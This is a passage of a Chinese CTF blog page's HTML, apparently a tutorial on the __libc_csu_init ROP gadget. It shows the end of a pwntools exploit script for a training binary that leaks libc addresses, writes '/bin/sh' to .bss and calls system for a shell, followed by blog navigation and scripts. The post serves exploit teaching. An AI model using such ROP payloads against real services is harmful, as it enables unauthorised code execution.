class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"read_got= "</span> + hex(read_got)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400587</span></span><br><span class="line"></span><br><span class="line">system_off_addr = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_off_addr= "</span> + hex(system_off_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#write(rdi=1,rsi=write_got,rdx=8)</span></span><br><span class="line">payload1 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload1 += <span class="string">"\x00"</span>*<span class="number">56</span>  <span class="comment">#0x38</span></span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n################seding payload1################\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr= "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - system_off_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr= "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#read(rdi=0,rsi=bss_addr,rdx=16)</span></span><br><span class="line">payload2 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload2 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">16</span>) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload2 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###############seding payload2################\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr))</span><br><span class="line">p.send(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#system(rdi=bss_addr+8="/bin/sh\0")</span></span><br><span class="line">payload3 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload3 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) +p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload3 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload3 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n##############seding payload3###############\n"</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/gadget-libc-csu-init.html">gadget_libc_csu_init</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 Thriumph 的个人博客">Thriumph</a></p>
+        <p><span>发布时间:</span>2019年04月03日 - 11时53分</p>
+        <p><span>最后更新:</span>2019年08月19日 - 02时28分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/gadget-libc-csu-init.html" title="gadget_libc_csu_init">http://yoursite.com/gadget-libc-csu-init.html</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/gadget-libc-csu-init.html　　作者: Thriumph" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/掘安杯.html" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          掘安杯
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/嘉韦思杯.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">嘉韦思杯</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#原理"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#libc-cus-init函数"><span class="toc-number">2.</span> <span class="toc-text">_libc_cus_init函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例：蒸米的level5"><span class="toc-number">3.</span> <span class="toc-text">例：蒸米的level5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#level-c"><span class="toc-number">3.1.</span> <span class="toc-text">level.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#playload1"><span class="toc-number">3.2.</span> <span class="toc-text">playload1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#playload2"><span class="toc-number">3.3.</span> <span class="toc-text">playload2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#playload3"><span class="toc-number">3.4.</span> <span class="toc-text">playload3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">3.5.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section class="changyan" id="comments">
+  <!--<div id="uyan_frame"></div>-->
+  <div id="SOHUCS"></div>
+  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
+  <script type="text/javascript">
+    window.changyan.api.config({
+      appid: 'xxxx',
+      conf: 'xxxxxxxxx'
+    });
+  </script>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/掘安杯.html" title="上一篇: 掘安杯">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/嘉韦思杯.html" title="下一篇: 嘉韦思杯">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/格式化字符串漏洞.html">格式化字符串漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/一个有趣的a+b.html">一个有趣的a+b</a></li><li class="post-list-item"><a class="post-list-link" href="/多媒体网络.html">多媒体网络</a></li><li class="post-list-item"><a class="post-list-link" href="/计算机网络中的安全.html">计算机网络中的安全</a></li><li class="post-list-item"><a class="post-list-link" href="/无线网络和移动网络.html">无线网络和移动网络</a></li><li class="post-list-item"><a class="post-list-link" href="/链路层和局域网.html">链路层和局域网</a></li><li class="post-list-item"><a class="post-list-link" href="/网络层-控制平面.html">网络层:控制平面</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】cmd1.html">【Pwnable.kr】cmd1</a></li><li class="post-list-item"><a class="post-list-link" href="/网络层-数据平面.html">网络层:数据平面</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】lotto.html">【Pwnable.kr】lotto</a></li><li class="post-list-item"><a class="post-list-link" href="/运输层.html">运输层</a></li><li class="post-list-item"><a class="post-list-link" href="/应用层.html">应用层</a></li><li class="post-list-item"><a class="post-list-link" href="/计算机网络和因特网.html">计算机网络和因特网</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】blackjack.html">【Pwnable.kr】blackjack</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】coin1.html">【Pwnable.kr】coin1</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】shellcode.html">【Pwnable.kr】shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】mistake.html">【Pwnable.kr】mistake</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】leg.html">【Pwnable.kr】leg</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】input.html">【Pwnable.kr】input</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】random.html">【Pwnable.kr】random</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】passcode.html">【Pwnable.kr】passcode</a></li><li class="post-list-item"><a class="post-list-link" href="/选择.html">选择</a></li><li class="post-list-item"><a class="post-list-link" href="/十大排序.html">十大排序</a></li><li class="post-list-item"><a class="post-list-link" href="/RC4.html">RC4</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】collision.html">【Pwnable.kr】collision</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】flag.html">【Pwnable.kr】flag</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】bof.html">【Pwnable.kr】bof</a></li><li class="post-list-item"><a class="post-list-link" href="/【Pwnable-kr】fd.html">【Pwnable.kr】fd</a></li><li class="post-list-item"><a class="post-list-link" href="/哈夫曼树.html">哈夫曼树</a></li><li class="post-list-item"><a class="post-list-link" href="/数据结构课程设计.html">数据结构课程设计</a></li><li class="post-list-item"><a class="post-list-link" href="/ISCC2019线上.html">ISCC2019线上</a></li><li class="post-list-item"><a class="post-list-link" href="/DFS递归形式和非递归形式.html">DFS递归形式和非递归形式</a></li><li class="post-list-item"><a class="post-list-link" href="/链表.html">链表</a></li><li class="post-list-item"><a class="post-list-link" href="/掘安杯.html">掘安杯</a></li><li class="post-list-item"><a class="post-list-link" href="/gadget-libc-csu-init.html">gadget_libc_csu_init</a></li><li class="post-list-item"><a class="post-list-link" href="/嘉韦思杯.html">嘉韦思杯</a></li><li class="post-list-item"><a class="post-list-link" href="/linux下基本缓冲区溢出shellcode编写.html">linux下基本缓冲区溢出shellcode编写</a></li><li class="post-list-item"><a class="post-list-link" href="/基本ROP.html">基本ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/栈溢出的保护机制和利用方法.html">栈溢出的保护机制和利用方法</a></li><li class="post-list-item"><a class="post-list-link" href="/gdb常用命令.html">gdb常用命令</a></li><li class="post-list-item"><a class="post-list-link" href="/pwn-环境配置.html">pwn 环境配置</a></li><li class="post-list-item"><a class="post-list-link" href="/kali更新源.html">kali更新源</a></li><li class="post-list-item"><a class="post-list-link" href="/rc3ctf-logmein.html">rc3ctf--logmein</a></li><li class="post-list-item"><a class="post-list-link" href="/ctf编码加解密总结.html">ctf编码加解密总结</a></li><li class="post-list-item"><a class="post-list-link" href="/DLL注入.html">DLL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/windows消息钩取.html">windows消息钩取</a></li><li class="post-list-item"><a class="post-list-link" href="/BugKu逆向.html">BugKu逆向</a></li><li class="post-list-item"><a class="post-list-link" href="/内嵌补丁.html">内嵌补丁</a></li><li class="post-list-item"><a class="post-list-link" href="/ESP脱壳定律.html">ESP定律脱壳</a></li><li class="post-list-item"><a class="post-list-link" href="/IAT导入地址表-EAT机制.html">IAT导入地址表/EAT机制</a></li><li class="post-list-item"><a class="post-list-link" href="/VA-RVA-RAW.html">VA RVA RAW</a></li><li class="post-list-item"><a class="post-list-link" href="/PE文件格式.html">PE文件格式</a></li><li class="post-list-item"><a class="post-list-link" href="/寄存器.html">寄存器</a></li><li class="post-list-item"><a class="post-list-link" href="/栈帧.html">栈帧</a></li><li class="post-list-item"><a class="post-list-link" href="/南邮逆向.html">南邮逆向</a></li><li class="post-list-item"><a class="post-list-link" href="/ctf-play-a-game.html">ctf play a game</a></li><li class="post-list-item"><a class="post-list-link" href="/关于二进制.html">关于二进制</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 Thriumph
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 4;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
